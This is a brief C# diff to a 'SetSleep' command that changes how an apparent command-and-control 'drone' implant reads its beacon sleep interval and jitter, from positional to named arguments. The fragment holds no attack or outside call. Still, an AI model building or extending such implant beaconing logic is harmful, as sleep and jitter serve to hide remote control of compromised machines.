@@ -10,11 +10,11 @@ public class SetSleep : DroneCommand
     
     public override Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
-        if (task.Arguments.Length > 0)
-            Drone.Config.Set(Setting.SLEEP_INTERVAL, int.Parse(task.Arguments[0]));
+        if (task.Arguments.TryGetValue("interval", out var interval))
+            Drone.Config.Set(Setting.SLEEP_INTERVAL, int.Parse(interval));
         
-        if (task.Arguments.Length > 1)
-            Drone.Config.Set(Setting.SLEEP_JITTER, int.Parse(task.Arguments[1]));
+        if (task.Arguments.TryGetValue("jitter", out var jitter))
+            Drone.Config.Set(Setting.SLEEP_JITTER, int.Parse(jitter));
         
         return Task.CompletedTask;
     }
